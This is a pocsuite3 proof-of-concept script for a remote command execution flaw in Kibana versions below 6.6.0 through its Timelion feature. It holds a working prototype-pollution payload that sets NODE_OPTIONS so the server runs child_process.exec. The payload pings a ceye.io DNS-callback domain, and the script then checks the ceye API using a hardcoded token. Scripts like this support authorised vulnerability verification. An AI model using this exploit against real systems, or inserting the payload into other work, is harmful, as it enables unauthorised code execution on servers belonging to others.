#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import logger
from pocsuite3.lib.utils import random_str
from time import sleep

class Kibana(POCBase):
    vulID = '98089'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2019-10-17'
    createDate = '2019-11-04'
    updateDate = '2019-11-04'
    references = ['https://www.seebug.org/vuldb/ssvid-98089']
    name = 'Kibana < 6.6.0 Timelion function remote command execution vulnerability'
    appPowerLink = 'http://www.elasticsearch.cn/'
    appName = 'kibana'
    appVersion = '< 6.6.0'
    vulType = 'rce'
    desc = '''
    Kibana < 6.6.0 Timelion功能远程命令执行漏洞
    '''

    def _headers(self):
        headers = {
            "Accept":"application/json,text/plain,*/*",
            "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
            "Content-Type":"application/json;charset=UTF-8",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9",
            "Connection":"close",
            "kbn-version":"6.5.4"
        }
        return headers

    def _payload(self, cmd):
        payload = {
            "sheet": [".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"ping %s\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')" % cmd],
            "time": {"from": "now-15m", "to": "now", "mode": "quick", "interval": "auto", "timezone": "Asia/Shanghai"}
        }
        return payload

    def _verify(self):
        result = {}
        headers = self._headers()
        cmd = random_str(16) + '.6eb4yw.ceye.io'
        payload = self._payload(cmd)
        try:
            if self.url[-1] == '/':
                url = self.url + 'api/timelion/run'
            else:
                url = self.url + '/api/timelion/run'
            requests.post(url, headers=headers, data=payload)
            sleep(2)
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(Kibana)